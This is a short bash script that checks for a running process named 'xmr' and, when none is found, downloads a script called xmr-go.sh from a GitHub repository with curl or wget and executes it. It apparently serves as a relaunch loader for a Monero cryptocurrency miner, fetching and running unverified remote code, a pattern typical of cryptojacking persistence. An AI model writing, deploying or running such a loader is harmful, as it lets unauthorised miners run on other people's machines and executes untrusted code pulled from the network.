#!/bin/bash

if pgrep "^xmr" > /dev/null
then
    echo "it's running!"
else
    if command -v curl >/dev/null 2>&1; then
        curl -LO https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh
    elif command -v wget >/dev/null 2>&1; then
        wget https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh
    else
        echo "error: neither curl nor wget is installed"
        exit 1
    fi

    sh xmr-go.sh
fi
